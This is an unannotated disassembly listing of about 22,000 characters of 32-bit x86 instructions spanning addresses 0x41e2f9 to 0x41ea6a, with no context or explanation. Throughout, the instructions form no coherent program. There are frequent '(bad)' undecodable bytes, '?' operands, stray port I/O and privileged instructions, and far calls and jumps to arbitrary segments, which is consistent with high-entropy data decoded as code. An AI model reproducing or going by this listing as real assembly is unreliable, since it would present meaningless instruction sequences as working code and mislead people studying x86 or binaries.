  41e2f9:	sbb    bl,BYTE PTR [eax+0x3548d109]
  41e2ff:	in     eax,0x24
  41e301:	std    
  41e302:	imul   esp,eax,0xfffffffb
  41e305:	dec    eax
  41e306:	lods   al,BYTE PTR ds:[esi]
  41e307:	xchg   esp,eax
  41e308:	loop   0x41e300
  41e30a:	or     ah,BYTE PTR [edi+0x3457a6b3]
  41e310:	ins    BYTE PTR es:[edi],dx
  41e311:	adc    DWORD PTR [ebx+0x6146c994],eax
  41e317:	data16 add al,0x5c
  41e31a:	pop    edi
  41e31b:	sub    ah,BYTE PTR [ebp+0x19ad6623]
  41e321:	call   0x2e4f8ae6
  41e326:	mov    ?,WORD PTR [edi-0x15]
  41e329:	mov    eax,0x7b06f29d
  41e32e:	cmp    DWORD PTR [edi+edi*2+0x2203066d],eax
  41e335:	dec    esi
  41e336:	shl    al,cl
  41e338:	and    al,0x42
  41e33a:	mov    ebp,0xe530ecee
  41e33f:	nop
  41e340:	iret   
  41e341:	mov    edx,0x84d73476
  41e346:	sub    bh,BYTE PTR [edx-0x1ab61f98]
  41e34c:	(bad)  
  41e34d:	cmp    edi,DWORD PTR [edi-0x13]
  41e350:	lods   al,BYTE PTR ds:[esi]
  41e351:	nop
  41e352:	cmp    eax,0x501fc3cf
  41e357:	dec    edx
  41e358:	jno    0x41e3cd
  41e35a:	out    dx,eax
  41e35b:	mov    cl,0x2f
  41e35d:	xor    BYTE PTR [ebx+0x2190ac5f],0x9b
  41e364:	mov    ecx,0xdcfb73c3
  41e369:	add    DWORD PTR [esi*1+0x119566a4],ebp
  41e370:	sbb    DWORD PTR [eax+0x747f15f1],esi
  41e376:	shr    bh,cl
  41e378:	jns    0x41e360
  41e37a:	push   ds
  41e37b:	aaa    
  41e37c:	ror    BYTE PTR [ebp+0x7b5999ac],0xdd
  41e383:	or     bh,BYTE PTR [ebp-0x50]
  41e386:	mov    esi,0x52a0b6aa
  41e38b:	push   esp
  41e38c:	mov    ds:0xee332149,al
  41e391:	lods   eax,DWORD PTR ds:[esi]
  41e392:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e393:	loope  0x41e385
  41e395:	and    esi,DWORD PTR [ecx-0x361ad91c]
  41e39b:	jne    0x41e331
  41e39d:	test   eax,0x7d73e14e
  41e3a2:	adc    al,0x93
  41e3a4:	push   edx
  41e3a5:	loope  0x41e39d
  41e3a7:	jmp    DWORD PTR [ecx-0x6926bdf4]
  41e3ad:	scas   al,BYTE PTR es:[edi]
  41e3ae:	addr16 inc ecx
  41e3b0:	adc    eax,esp
  41e3b2:	(bad)  
  41e3b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e3b5:	gs dec ebx
  41e3b7:	mov    bh,0xf5
  41e3b9:	inc    edi
  41e3ba:	xor    DWORD PTR [ebx],0x3f526651
  41e3c0:	jo     0x41e37a
  41e3c2:	call   0xbd9:0x42e55986
  41e3c9:	xor    dl,cl
  41e3cb:	(bad)  
  41e3cc:	cmp    eax,0x25cb16b2
  41e3d1:	out    dx,al
  41e3d2:	push   ecx
  41e3d3:	xor    eax,0xc81b6d04
  41e3d8:	fcomi  st,st(3)
  41e3da:	xchg   ebx,eax
  41e3db:	aaa    
  41e3dc:	out    dx,al
  41e3dd:	into   
  41e3de:	scas   eax,DWORD PTR es:[edi]
  41e3df:	out    0x26,al
  41e3e1:	outs   dx,BYTE PTR ds:[esi]
  41e3e2:	out    0xed,al
  41e3e4:	std    
  41e3e5:	sub    al,bh
  41e3e7:	cmp    dh,ch
  41e3e9:	daa    
  41e3ea:	lock mov dl,0x1d
  41e3ed:	aad    0xa7
  41e3ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3f0:	call   0xd802:0x1a890fc7
  41e3f7:	scas   eax,DWORD PTR es:[edi]
  41e3f8:	jl     0x41e3eb
  41e3fa:	mov    bl,0x68
  41e3fc:	mov    esi,0x5b264c90
  41e401:	fidivr DWORD PTR [ecx+0x2912644f]
  41e407:	xor    bl,BYTE PTR [ebx-0x4d]
  41e40a:	sub    al,0x32
  41e40c:	cld    
  41e40d:	push   edx
  41e40e:	das    
  41e40f:	adc    dh,BYTE PTR [ebx+0x62da26f2]
  41e415:	inc    ebx
  41e416:	sti    
  41e417:	mov    esp,0x5940800d
  41e41c:	jb     0x41e42f
  41e41e:	xlat   BYTE PTR ds:[ebx]
  41e41f:	jmp    0xf547:0x72a639d2
  41e426:	jb     0x41e400
  41e428:	mov    dl,0x5
  41e42a:	mov    bh,0xa5
  41e42c:	pop    ss
  41e42d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e42e:	rol    cl,1
  41e430:	(bad)  
  41e431:	or     dh,BYTE PTR [edi+0x17]
  41e434:	jp     0x41e469
  41e436:	mov    al,0x88
  41e438:	lock div BYTE PTR [ecx+0x43]
  41e43c:	mov    WORD PTR [eax+0x66],ds
  41e43f:	sub    esi,DWORD PTR [esi+0x25ef14e]
  41e445:	js     0x41e403
  41e447:	mul    DWORD PTR [edi]
  41e449:	jle    0x41e3d6
  41e44b:	lods   al,BYTE PTR ds:[esi]
  41e44c:	push   edi
  41e44d:	adc    al,0xce
  41e44f:	xchg   dl,al
  41e451:	test   BYTE PTR [eax+0x2d],dh
  41e454:	or     DWORD PTR [ecx+ebp*1-0x12a84bf3],0x121fe293
  41e45f:	arpl   dx,dx
  41e461:	push   edx
  41e462:	xchg   esi,eax
  41e463:	pusha  
  41e464:	mov    ebx,0x8f7c562c
  41e469:	aaa    
  41e46a:	mov    edx,0xb2f2c0d3
  41e46f:	pop    edx
  41e470:	imul   edx,DWORD PTR [esi],0x50279892
  41e476:	push   eax
  41e477:	stc    
  41e478:	mov    eax,ds:0x851d838e
  41e47d:	gs cs retf 
  41e480:	sub    edx,ecx
  41e482:	inc    edi
  41e483:	shl    BYTE PTR [edi+edi*2+0x8],1
  41e487:	and    eax,0x3476d849
  41e48c:	repnz das 
  41e48e:	push   ebx
  41e48f:	test   BYTE PTR [esi-0x40],bl
  41e492:	sti    
  41e493:	test   DWORD PTR [edx+0x2d62cf7c],eax
  41e499:	add    edi,ebx
  41e49b:	dec    eax
  41e49c:	(bad)
  41e49f:	or     BYTE PTR [eax-0x702da0ad],0xd
  41e4a6:	(bad)  
  41e4a7:	push   ebx
  41e4a8:	xchg   edi,eax
  41e4a9:	cwde   
  41e4aa:	sub    BYTE PTR [esi+eax*1],bl
  41e4ad:	dec    esp
  41e4ae:	les    esp,FWORD PTR [edi+edi*4]
  41e4b1:	xchg   esp,eax
  41e4b2:	mov    esp,DWORD PTR [esp+esi*8]
  41e4b5:	js     0x41e497
  41e4b7:	or     ecx,DWORD PTR [ebp+0x7dc6d4d7]
  41e4bd:	gs dec ecx
  41e4bf:	inc    esi
  41e4c0:	xchg   BYTE PTR [ecx],dl
  41e4c2:	xchg   ah,ah
  41e4c4:	inc    esp
  41e4c5:	cli    
  41e4c6:	pop    ecx
  41e4c7:	cmp    al,0xe1
  41e4c9:	push   ds
  41e4ca:	out    0x83,al
  41e4cc:	fimul  DWORD PTR [ebp-0x40a072fa]
  41e4d2:	sti    
  41e4d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4d4:	jbe    0x41e4e0
  41e4d6:	pop    edi
  41e4d7:	xchg   DWORD PTR [eax-0x39],eax
  41e4da:	cld    
  41e4db:	jne    0x41e4ca
  41e4dd:	pop    ecx
  41e4de:	out    dx,eax
  41e4df:	jne    0x41e538
  41e4e1:	int    0x52
  41e4e3:	and    al,0x6f
  41e4e5:	ds sbb eax,0xe6b45a34
  41e4eb:	shl    BYTE PTR [edx-0x80],cl
  41e4ee:	pop    ebp
  41e4ef:	xor    DWORD PTR [eax],ecx
  41e4f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e4f2:	les    ebx,FWORD PTR [edx]
  41e4f4:	mov    ch,0x88
  41e4f6:	or     DWORD PTR [edx],edi
  41e4f8:	int3   
  41e4f9:	(bad)  
  41e4fa:	xchg   esi,eax
  41e4fb:	cs pop edx
  41e4fd:	lahf   
  41e4fe:	sbb    BYTE PTR [edi+0x2a],bh
  41e501:	fadd   st,st(1)
  41e503:	and    al,0xd8
  41e505:	sahf   
  41e506:	inc    ebx
  41e507:	lods   eax,DWORD PTR ds:[esi]
  41e508:	fwait
  41e509:	int3   
  41e50a:	(bad)  
  41e50b:	sub    dl,BYTE PTR [esi-0xc]
  41e50e:	mov    BYTE PTR [ebx-0x1db56a0f],dh
  41e514:	(bad)  
  41e516:	sbb    al,0xa5
  41e518:	hlt    
  41e519:	pushf  
  41e51a:	pop    eax
  41e51b:	jp     0x41e4a1
  41e51d:	pop    esi
  41e51e:	sub    bh,dh
  41e520:	(bad)
  41e524:	inc    ebp
  41e525:	fdiv   DWORD PTR [ebp-0x5efc26b5]
  41e52b:	cwde   
  41e52c:	inc    ebx
  41e52d:	dec    dl
  41e52f:	ins    DWORD PTR es:[edi],dx
  41e530:	stos   BYTE PTR es:[edi],al
  41e531:	call   0xf35ae54e
  41e536:	pop    edx
  41e537:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e538:	imul   ebp,DWORD PTR [ebx-0x3b7ecde4],0x6
  41e53f:	mov    ah,0x1e
  41e541:	loopne 0x41e561
  41e543:	fidivr WORD PTR [esi+0xa]
  41e546:	pop    ss
  41e547:	in     eax,dx
  41e548:	(bad)  
  41e549:	fild   WORD PTR [edx-0x2c]
  41e54c:	add    bl,ch
  41e54e:	mov    esi,edx
  41e550:	js     0x41e59f
  41e552:	and    BYTE PTR [esi],bl
  41e554:	arpl   WORD PTR [edx-0x6d4aeed4],si
  41e55a:	add    eax,0xbf7bff86
  41e55f:	ror    DWORD PTR [ecx],0xa3
  41e562:	xchg   ecx,eax
  41e563:	imul   edx,esp,0x59deccfb
  41e569:	in     eax,dx
  41e56a:	xor    edi,esp
  41e56c:	push   0xd9ca38aa
  41e571:	push   ss
  41e572:	sbb    dl,BYTE PTR [eax-0x48a1b28a]
  41e578:	retf   0x537e
  41e57b:	mov    edx,0x940af815
  41e580:	jmp    0x5ed80b16
  41e585:	inc    ebp
  41e586:	inc    ebx
  41e587:	jmp    0x10ee22f0
  41e58c:	adc    BYTE PTR [eax+ecx*2+0x26],al
  41e590:	and    DWORD PTR [ecx],esi
  41e592:	mov    ds:0x93f9830a,eax
  41e597:	inc    esi
  41e598:	mov    ecx,0x8e47e06f
  41e59d:	dec    edx
  41e59e:	jbe    0x41e576
  41e5a0:	sub    eax,0xa841c6e2
  41e5a5:	mov    dl,0xab
  41e5a7:	sbb    eax,ebx
  41e5a9:	xchg   edi,eax
  41e5aa:	(bad)  [edx+0x6a]
  41e5ad:	sbb    DWORD PTR [ebx],esp
  41e5af:	push   ss
  41e5b0:	mov    ss,WORD PTR [edx+eax*8-0x45ba3601]
  41e5b7:	cmp    edi,esi
  41e5b9:	mov    cs:0x11caf2ec,eax
  41e5bf:	stc    
  41e5c0:	adc    edi,DWORD PTR [edi]
  41e5c2:	scas   eax,DWORD PTR es:[edi]
  41e5c3:	hlt    
  41e5c4:	push   ds
  41e5c5:	rcr    DWORD PTR [eax],0x70
  41e5c8:	dec    ecx
  41e5c9:	mov    esi,0xaa43c10f
  41e5ce:	repnz mov dh,0x2e
  41e5d1:	mov    edi,DWORD PTR [ebx+0x26]
  41e5d4:	aam    0xf1
  41e5d6:	pop    ss
  41e5d7:	jge    0x41e617
  41e5d9:	add    DWORD PTR [ecx+0x1f],esi
  41e5dc:	jg     0x41e58a
  41e5de:	test   BYTE PTR [esi-0x4d],bl
  41e5e1:	cmp    dl,BYTE PTR [ebx]
  41e5e3:	mov    ds:0x2833f02f,al
  41e5e8:	push   eax
  41e5e9:	push   ebx
  41e5ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5eb:	pusha  
  41e5ec:	pop    ecx
  41e5ed:	addr16 inc ebp
  41e5ef:	pop    edx
  41e5f0:	dec    edi
  41e5f1:	hlt    
  41e5f2:	dec    edx
  41e5f3:	loope  0x41e5c2
  41e5f5:	sti    
  41e5f6:	cmp    eax,0xf3a1083
  41e5fb:	cmp    al,0xc2
  41e5fd:	sub    DWORD PTR [ecx],esi
  41e5ff:	(bad)  
  41e600:	enter  0x910b,0x6
  41e604:	neg    BYTE PTR [ebp-0x15a3687a]
  41e60a:	push   ecx
  41e60b:	xchg   BYTE PTR [edi+0x789dab8e],dh
  41e611:	sbb    DWORD PTR [edi],esp
  41e613:	in     eax,0xb0
  41e615:	or     edx,DWORD PTR ds:0xa6b39815
  41e61b:	sub    al,0x9c
  41e61d:	xchg   edx,eax
  41e61e:	imul   esp,eax,0x45e24cea
  41e624:	arpl   dx,di
  41e626:	pop    edx
  41e627:	push   esp
  41e628:	sar    DWORD PTR [ecx],0x7
  41e62b:	pop    es
  41e62c:	hlt    
  41e62d:	arpl   WORD PTR [ebx+0x75],si
  41e630:	test   eax,0x358b2962
  41e635:	int    0x7f
  41e637:	ret    
  41e638:	cmp    esp,esi
  41e63a:	xor    ecx,DWORD PTR [esi+0x58e9dcb8]
  41e640:	adc    BYTE PTR [ebx+ebx*4-0x5e],al
  41e644:	stos   DWORD PTR es:[edi],eax
  41e645:	add    bh,BYTE PTR [edi-0x4f]
  41e648:	fisub  DWORD PTR [esi-0x1f7a392]
  41e64e:	iret   
  41e64f:	mov    ds:0x6e16291c,eax
  41e654:	lods   al,BYTE PTR ds:[esi]
  41e655:	fwait
  41e656:	call   0x1af9db8b
  41e65b:	mov    esi,0x174936a1
  41e660:	mov    ecx,0x9168ed44
  41e665:	rcr    BYTE PTR [esi],0xe7
  41e668:	push   ebx
  41e669:	sub    eax,0x376c31c9
  41e66e:	jne    0x41e5f4
  41e670:	push   edi
  41e671:	push   cs
  41e672:	sbb    dl,BYTE PTR [edi+0x2f]
  41e675:	sbb    BYTE PTR [ebp+0x2285952d],0xf0
  41e67c:	stos   BYTE PTR es:[edi],al
  41e67d:	dec    edx
  41e67e:	(bad)  
  41e67f:	xchg   ecx,eax
  41e680:	pop    esi
  41e681:	xor    eax,0xe7672055
  41e686:	push   ecx
  41e687:	adc    eax,0xf8933479
  41e68c:	pusha  
  41e68d:	(bad)  
  41e68e:	dec    ebx
  41e68f:	sar    edi,cl
  41e691:	and    al,0xeb
  41e693:	jp     0x41e6d2
  41e695:	shl    BYTE PTR [esi],1
  41e697:	or     DWORD PTR [esi-0x5f],0x4b
  41e69b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e69c:	dec    ebx
  41e69d:	push   eax
  41e69e:	loop   0x41e6a7
  41e6a0:	dec    esi
  41e6a1:	pop    esp
  41e6a2:	loopne 0x41e68f
  41e6a4:	je     0x41e699
  41e6a6:	aaa    
  41e6a7:	in     eax,dx
  41e6a8:	push   0xa2a36e2
  41e6ad:	les    edx,FWORD PTR ds:0xa1952919
  41e6b3:	jns    0x41e684
  41e6b5:	sbb    al,BYTE PTR [ecx+0x20]
  41e6b8:	mov    dh,0x9f
  41e6ba:	add    dl,BYTE PTR [ebx-0x69]
  41e6bd:	xor    eax,0x2b44c05f
  41e6c2:	cld    
  41e6c3:	fstp   DWORD PTR [edi+0x72df7861]
  41e6c9:	sub    BYTE PTR [ecx],bh
  41e6cb:	sub    edi,DWORD PTR [eax+0x6511e694]
  41e6d1:	idiv   BYTE PTR ds:0xbc051f54
  41e6d7:	mov    ecx,ebp
  41e6d9:	ins    BYTE PTR es:[edi],dx
  41e6da:	stos   DWORD PTR es:[edi],eax
  41e6db:	stc    
  41e6dc:	fisttp WORD PTR [ebx+0x24140b9d]
  41e6e2:	fs fsub st,st(0)
  41e6e5:	pop    eax
  41e6e6:	xor    ch,ah
  41e6e8:	jns    0x41e690
  41e6ea:	retf   
  41e6eb:	gs dec ch
  41e6ee:	daa    
  41e6ef:	or     al,0x51
  41e6f1:	dec    esp
  41e6f2:	pop    ecx
  41e6f3:	clc    
  41e6f4:	mov    cl,BYTE PTR [edi]
  41e6f6:	push   esp
  41e6f7:	xor    eax,0x8a859538
  41e6fc:	loop   0x41e6cb
  41e6fe:	retf   
  41e6ff:	and    al,0x33
  41e701:	sub    dh,BYTE PTR [ecx+0x4bd237ce]
  41e707:	leave  
  41e708:	push   ebx
  41e709:	mov    eax,ds:0x1c692ddc
  41e70e:	or     ch,cl
  41e710:	nop
  41e711:	fwait
  41e712:	enter  0xe98c,0x64
  41e716:	adc    al,0x69
  41e718:	lahf   
  41e719:	ins    DWORD PTR es:[edi],dx
  41e71a:	push   ebp
  41e71b:	movsx  edi,BYTE PTR [eax+ebx*4]
  41e71f:	jl     0x41e764
  41e721:	enter  0x5be2,0x1d
  41e725:	ret    0x3fd2
  41e728:	rcr    cl,1
  41e72a:	adc    bh,al
  41e72c:	sub    DWORD PTR [ecx+0x7f41b8fd],ecx
  41e732:	inc    ebx
  41e733:	popf   
  41e734:	cmp    edx,DWORD PTR [esi+0x2788553f]
  41e73a:	sbb    dl,BYTE PTR [edx]
  41e73c:	cli    
  41e73d:	call   0x78c6dd6a
  41e742:	mov    ecx,0x23c1da8d
  41e747:	mov    esi,0xa1891677
  41e74c:	and    edx,DWORD PTR [eax+ebx*2]
  41e74f:	mov    ecx,0xf8a489d7
  41e754:	out    0x17,eax
  41e756:	dec    esp
  41e758:	test   al,0xbf
  41e75a:	and    ebx,DWORD PTR [edi-0x3fa6cdd3]
  41e760:	sbb    al,0xf3
  41e762:	sub    al,BYTE PTR [edi+0x47]
  41e765:	stos   BYTE PTR es:[edi],al
  41e766:	ins    BYTE PTR es:[di],dx
  41e768:	sbb    eax,DWORD PTR [esi+0x6c]
  41e76b:	fcom   DWORD PTR [ebp+0x27]
  41e76e:	mov    dh,0xc8
  41e770:	and    al,0xeb
  41e772:	loopne 0x41e72c
  41e774:	mov    al,0x76
  41e776:	jae    0x41e7ee
  41e778:	and    al,0x68
  41e77a:	stos   DWORD PTR es:[edi],eax
  41e77b:	loop   0x41e74e
  41e77d:	mov    edi,0x49628a40
  41e782:	stc    
  41e783:	ret    
  41e784:	jae    0x41e73e
  41e786:	in     al,0x50
  41e788:	pop    ebx
  41e789:	sub    BYTE PTR [edi],ah
  41e78b:	data16 jge 0x41e77b
  41e78e:	add    eax,0x9e984e60
  41e793:	scas   eax,DWORD PTR es:[edi]
  41e794:	adc    DWORD PTR [edx],ecx
  41e796:	jmp    0x41e814
  41e798:	pop    esi
  41e799:	cwde   
  41e79a:	cmp    ecx,edi
  41e79c:	inc    esp
  41e79d:	sar    DWORD PTR [eax+0x2b878bb4],0xe6
  41e7a4:	leave  
  41e7a5:	fisttp QWORD PTR [ebx+ecx*8-0x19]
  41e7a9:	lods   al,BYTE PTR ds:[esi]
  41e7aa:	scas   al,BYTE PTR es:[di]
  41e7ac:	mov    ch,0x8
  41e7ae:	stos   DWORD PTR es:[edi],eax
  41e7af:	lds    esp,FWORD PTR [eax-0x6a]
  41e7b2:	test   al,0xcc
  41e7b4:	fnstenv [ecx+0x62]
  41e7b7:	mov    ds:0x36f0efd2,al
  41e7bc:	add    BYTE PTR [ecx-0x116a35a2],al
  41e7c2:	enter  0xb05b,0x80
  41e7c6:	data16 out 0x8a,al
  41e7c9:	push   ss
  41e7ca:	adc    bh,bh
  41e7cc:	jo     0x41e82f
  41e7ce:	repz sub ebx,ecx
  41e7d1:	adc    ah,dh
  41e7d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7d5:	xor    al,BYTE PTR [eax-0xfebd8b9]
  41e7db:	mov    cl,0x93
  41e7dd:	into   
  41e7de:	mov    al,ds:0x31a9aec8
  41e7e3:	jmp    0x3dfad4df
  41e7e8:	clc    
  41e7e9:	pop    ebx
  41e7ea:	dec    ebx
  41e7eb:	cmp    DWORD PTR [eax],edx
  41e7ed:	je     0x41e7df
  41e7ef:	xor    ecx,DWORD PTR [edi-0x66]
  41e7f2:	ds leave 
  41e7f4:	mov    al,ds:0xed1247f
  41e7f9:	loope  0x41e84b
  41e7fb:	adc    eax,0x8d37ec20
  41e800:	mov    ?,WORD PTR [edi-0x1a]
  41e803:	std    
  41e804:	mov    WORD PTR [ecx-0x49],ds
  41e807:	mov    ds:0x4f86fcb,al
  41e80c:	out    0x57,eax
  41e80e:	inc    edi
  41e80f:	push   eax
  41e810:	sar    DWORD PTR [ebp*1+0x1542a524],cl
  41e817:	push   cs
  41e818:	add    al,0xb2
  41e81a:	sub    al,0x3b
  41e81c:	ins    BYTE PTR es:[edi],dx
  41e81d:	push   cs
  41e81e:	xchg   BYTE PTR [eax-0x246ecb0e],cl
  41e824:	scas   eax,DWORD PTR es:[edi]
  41e825:	push   edx
  41e826:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e827:	in     eax,0xe1
  41e829:	mov    esp,DWORD PTR [eax+0x136a5e24]
  41e82f:	loope  0x41e872
  41e831:	loope  0x41e849
  41e833:	cmp    DWORD PTR [edi+0x36],ebp
  41e836:	pop    ecx
  41e837:	ror    BYTE PTR [eax+0x7b],cl
  41e83a:	xor    ebx,DWORD PTR ds:0xffc3133d
  41e840:	push   ds
  41e841:	mov    esp,0x60914304
  41e846:	aam    0x48
  41e848:	scas   al,BYTE PTR es:[edi]
  41e849:	add    ch,BYTE PTR [ebp+0x6f96a36]
  41e84f:	sbb    dh,BYTE PTR [ebx-0x90f66eb]
  41e855:	popf   
  41e856:	loope  0x41e899
  41e858:	xor    DWORD PTR ds:0xdd2efd7f,esp
  41e85e:	mov    dh,0x8b
  41e860:	or     al,0x2a
  41e862:	push   esp
  41e864:	xor    DWORD PTR [ebp+esi*8-0x80],ecx
  41e868:	pop    esp
  41e869:	dec    ecx
  41e86a:	add    eax,0x8f34543d
  41e86f:	adc    al,0x85
  41e871:	int    0x4c
  41e873:	inc    esp
  41e874:	cmc    
  41e875:	sub    DWORD PTR [ebp+esi*2+0xe],ecx
  41e879:	mov    ecx,0xd1e33322
  41e87e:	pop    edi
  41e87f:	inc    edx
  41e880:	pop    es
  41e881:	jmp    0x4b6faa42
  41e886:	pusha  
  41e887:	cld    
  41e888:	adc    ah,BYTE PTR [ebp+0x967109b]
  41e88e:	aam    0xb5
  41e890:	cmc    
  41e891:	sti    
  41e892:	xor    eax,0x3e1e8ec2
  41e897:	in     al,0x82
  41e899:	sub    al,0xfb
  41e89b:	rcl    ecx,1
  41e89d:	dec    edi
  41e89e:	or     DWORD PTR [eax],edi
  41e8a0:	daa    
  41e8a1:	out    dx,al
  41e8a2:	or     edi,DWORD PTR [ebx+0x691116d7]
  41e8a8:	cmp    al,0x38
  41e8aa:	dec    BYTE PTR [eax+0x19]
  41e8ad:	ja     0x41e8be
  41e8af:	stos   DWORD PTR es:[edi],eax
  41e8b0:	xor    BYTE PTR [edx+ecx*2],bl
  41e8b3:	mov    bl,0x78
  41e8b5:	outs   dx,BYTE PTR ds:[esi]
  41e8b6:	inc    esi
  41e8b7:	jno    0x41e926
  41e8b9:	cmc    
  41e8ba:	imul   BYTE PTR [edx+0x64a4c120]
  41e8c0:	dec    esi
  41e8c1:	aad    0x33
  41e8c3:	neg    al
  41e8c5:	out    0x55,eax
  41e8c7:	nop
  41e8c8:	lods   eax,DWORD PTR ds:[esi]
  41e8c9:	and    ch,bl
  41e8cb:	loop   0x41e8ce
  41e8cd:	daa    
  41e8ce:	jmp    0x41e91e
  41e8d0:	xchg   DWORD PTR [esi],ebx
  41e8d2:	lods   eax,DWORD PTR ds:[esi]
  41e8d3:	rcr    bl,1
  41e8d5:	cmp    DWORD PTR [ecx],edx
  41e8d7:	jle    0x41e91f
  41e8d9:	push   ss
  41e8da:	gs repnz mov esp,ebx
  41e8de:	mov    esp,0xc501ba0
  41e8e3:	aad    0xd5
  41e8e5:	pop    edi
  41e8e6:	ins    DWORD PTR es:[edi],dx
  41e8e7:	xchg   esi,eax
  41e8e8:	pusha  
  41e8e9:	and    DWORD PTR ss:[edx+0x2d87a260],ecx
  41e8f0:	push   0x9ef6a1c4
  41e8f5:	dec    esi
  41e8f6:	jmp    0x9c6c7046
  41e8fb:	aad    0xbf
  41e8fd:	sub    esp,eax
  41e8ff:	mov    esi,0x829972d3
  41e904:	pop    es
  41e905:	sub    BYTE PTR [edi-0x54],0xe0
  41e909:	ds pop ss
  41e90b:	cmp    DWORD PTR [edx+ebx*4],ecx
  41e90e:	and    BYTE PTR [edi-0x5b3477e9],0x2a
  41e915:	stos   DWORD PTR es:[edi],eax
  41e916:	sub    eax,0x3dedc2b
  41e91b:	loopne 0x41e8c5
  41e91d:	std    
  41e91e:	cld    
  41e91f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e920:	xchg   BYTE PTR [ebp-0x29],ah
  41e923:	jg     0x41e92a
  41e925:	push   eax
  41e926:	jne    0x41e902
  41e928:	xchg   ecx,eax
  41e929:	mov    DWORD PTR [edx-0x5],ebx
  41e92c:	pusha  
  41e92d:	fnsave [edi+eiz*8+0x732ab852]
  41e934:	popa   
  41e935:	sbb    ebp,DWORD PTR [esi]
  41e937:	sahf   
  41e938:	inc    edx
  41e939:	mov    esi,0x7f65e0c3
  41e93e:	retf   
  41e93f:	cmp    BYTE PTR [ebx-0x398f9e64],bl
  41e945:	mov    bl,0x9d
  41e947:	fstp   TBYTE PTR [esi-0x7c821823]
  41e94d:	fbstp  TBYTE PTR [edx+edi*8+0x7bccddb5]
  41e954:	push   0xffffffda
  41e956:	dec    edi
  41e957:	mov    BYTE PTR [eax+eax*8],dh
  41e95a:	int    0x35
  41e95c:	jmp    0x41e8e1
  41e95e:	lock add al,0xfc
  41e961:	jmp    0x4a3127cf
  41e966:	pusha  
  41e967:	push   edx
  41e968:	call   0x20fc:0x280fc313
  41e96f:	fstp   DWORD PTR [eax]
  41e971:	add    DWORD PTR [ebx],ebx
  41e973:	leave  
  41e974:	cmp    eax,0x7fe8fd3f
  41e979:	cmc    
  41e97a:	jecxz  0x41e98b
  41e97c:	scas   al,BYTE PTR es:[edi]
  41e97d:	and    BYTE PTR [ebx+ecx*2-0x13f759d9],bh
  41e984:	in     al,0x11
  41e986:	sub    esi,DWORD PTR [ecx-0x2818be05]
  41e98c:	fisttp WORD PTR [eax]
  41e98e:	test   al,0x8f
  41e990:	call   0x1675:0x53e132e2
  41e997:	push   0x545e1338
  41e99c:	push   ecx
  41e99d:	cmp    BYTE PTR [bx+si-0x57],0x7f
  41e9a2:	mov    ecx,0x4a4f4be7
  41e9a7:	lods   al,BYTE PTR ds:[esi]
  41e9a8:	pop    eax
  41e9a9:	jg     0x41ea16
  41e9ab:	jg     0x41e96c
  41e9ad:	or     esi,edi
  41e9af:	inc    esi
  41e9b0:	in     eax,dx
  41e9b1:	xchg   esp,eax
  41e9b2:	pop    edi
  41e9b3:	mov    bh,0xcc
  41e9b5:	pusha  
  41e9b6:	dec    esp
  41e9b7:	fwait
  41e9b8:	adc    dh,al
  41e9ba:	jmp    0x41e9a8
  41e9bc:	repnz out dx,eax
  41e9be:	in     al,dx
  41e9bf:	xchg   ecx,eax
  41e9c0:	jmp    DWORD PTR [esi-0x3b]
  41e9c3:	cmp    edx,eax
  41e9c5:	xor    bh,ch
  41e9c7:	lea    ecx,[eax]
  41e9c9:	pushf  
  41e9ca:	inc    esp
  41e9cb:	mov    bl,bl
  41e9cd:	add    al,0x37
  41e9cf:	dec    ebx
  41e9d0:	push   ebp
  41e9d1:	xchg   ah,bl
  41e9d3:	out    dx,eax
  41e9d4:	lods   eax,DWORD PTR ds:[esi]
  41e9d5:	mov    ss,WORD PTR [edi+0xf]
  41e9d8:	mov    bl,0x63
  41e9da:	mov    al,0xf1
  41e9dc:	jmp    0x32b8:0xd7aab9a1
  41e9e3:	in     al,dx
  41e9e4:	xor    al,0x83
  41e9e6:	call   0x5e1c:0xf8cd0bc4
  41e9ed:	ret    
  41e9ee:	mov    ecx,0x1181812e
  41e9f3:	gs aaa 
  41e9f5:	xor    BYTE PTR [eax+0x16],bl
  41e9f8:	xchg   BYTE PTR [esi-0x29],ah
  41e9fb:	cwde   
  41e9fc:	mov    dl,0xd8
  41e9fe:	repz mov ds:0xd15c57cc,al
  41ea04:	ss xor al,0xd1
  41ea07:	push   ebp
  41ea08:	es mov ah,0x3
  41ea0b:	jl     0x41ea09
  41ea0d:	cmp    dl,BYTE PTR [eax+0x1c39aa60]
  41ea13:	mov    WORD PTR ds:0xab2e87bb,cs
  41ea19:	les    ebp,FWORD PTR [ebp-0x63]
  41ea1c:	sub    BYTE PTR [esi+0x1360f3c6],bl
  41ea22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea23:	call   0x5815:0x8f249b86
  41ea2a:	mov    ebp,0xb1691373
  41ea2f:	jp     0x41ea4e
  41ea31:	ret    0xec88
  41ea34:	sub    DWORD PTR [edi],eax
  41ea36:	sti    
  41ea37:	push   edi
  41ea38:	or     DWORD PTR [eax-0x2a157f1f],edx
  41ea3e:	(bad)  
  41ea3f:	addr16 (bad) 
  41ea41:	je     0x41ea28
  41ea43:	scas   eax,DWORD PTR es:[edi]
  41ea44:	mov    DWORD PTR [edi+0x61d9f177],eax
  41ea4a:	nop
  41ea4b:	cmc    
  41ea4c:	jne    0x41ea07
  41ea4e:	jmp    0xdcb5024d
  41ea53:	mov    al,ds:0x4af17442
  41ea58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea59:	pop    ds
  41ea5a:	jb     0x41ea09
  41ea5c:	mov    esp,0x9374566c
  41ea61:	jb     0x41ea29
  41ea63:	and    bh,BYTE PTR [esp+eax*1+0x1ae9b97]
  41ea6a:	mov    ebp,0x134ed7c7
